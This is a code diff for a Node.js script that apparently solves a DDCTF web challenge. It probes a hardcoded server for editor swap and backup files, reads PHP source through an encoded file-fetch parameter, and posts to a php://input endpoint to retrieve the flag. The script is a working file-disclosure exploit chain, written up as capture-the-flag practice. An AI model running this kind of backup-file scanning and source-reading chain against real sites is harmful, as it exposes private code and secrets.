@@ -19,21 +19,30 @@ const base64 = {
   }
 }
 
+const acsii = {
+  decode (str) {
+    let output = ''
+    for (let index = 0; index < str.length; index += 2) {
+      output = output + String.fromCharCode(parseInt(str.slice(index, index + 2), 16))
+    }
+    return output
+  },
+  encode (str) {
+    let output = ''
+    for (let index = 0; index < str.length; index++) {
+      output = output + str.charCodeAt(index).toString(16)
+    }
+    return output
+  },
+}
+
 function decrypt (input) {
   input = base64.decode(base64.decode(input))
-  let output = ''
-  for (let index = 0; index < input.length; index += 2) {
-    output = output + String.fromCharCode(parseInt(input.slice(index, index + 2), 16))
-  }
-  return output
+  return acsii.decode(input)
 }
 
 function encrypt (input) {
-  let output = ''
-  for (let index = 0; index < input.length; index++) {
-    output = output + input.charCodeAt(index).toString(16)
-  }
-  return base64.encode(base64.encode(output))
+  return base64.encode(base64.encode(acsii.encode(input)))
 }
 
 async function fetch (filename) {
@@ -59,11 +68,28 @@ async function fetch (filename) {
   }
 }
 
+async function step4 () {
+  const url = `http://117.51.150.246/f1ag!ddctf.php?uid=yelo&k=php://input`
+  const { body } = await got.post(url, {
+    body: 'yelo',
+  })
+  return body
+}
+
 async function main () {
   try {
-    const result = await fetch('index.php')
-    console.log(JSON.stringify(result, null, 2))
-    console.log(result.content)
+    console.log('Step1: ---')
+    console.log((await fetch('index.php')).content)
+    console.log('Step2: ---')
+    console.log((await scan()))
+    console.log('Step3: ---')
+    console.log((await fetch('practice.txt.swp')).content)
+    console.log('Step4: ---')
+    console.log((await fetch('f1agconfigddctf.php')).content)
+    console.log('Step5: ---')
+    console.log(await step4())
+    console.log('Bonus: ---')
+    console.log(acsii.decode('436f6e67726174756c6174696f6e73')) // Congratulations
   } catch (error) {
     console.error(`Error: ${error.message}`)
   }
@@ -71,15 +97,10 @@ async function main () {
 
 async function scan () {
   const getFilenameFunctions = [
+    (n) => `${n}.swp`,
     (n) => `.${n}.swp`,
     (n) => `.${n}.swo`,
-    // (n) => `.${n}.swn`,
-    // (n) => `.${n}.swm`,
-    // (n) => `.${n}.swl`,
-    // (n) => `.${n}.swk`,
-    // (n) => `.${n}.swj`,
-    // (n) => `.${n}.swi`,
-    // (n) => `.${n}.swh`,
+    (n) => `.${n}.swn`,
     (n) => `${n}.bak`,
     (n) => n,
   ]
@@ -107,12 +128,14 @@ async function scan () {
     gauge.show('Fetch')
     const results = await pAll(requests, { concurrency: FETCH_CONCURRENCY })
     const availables = results.filter(({ content }) => content)
-    console.log(availables)
+    // find out:
+    // `practice.txt.swp`: `f1ag!ddctf.php`
+    return availables
     } catch (error) {
       console.log(error)
       console.error(`Error: ${error.message}`)
     }
 }
 
-scan()
-// main()
+// scan()
+main()
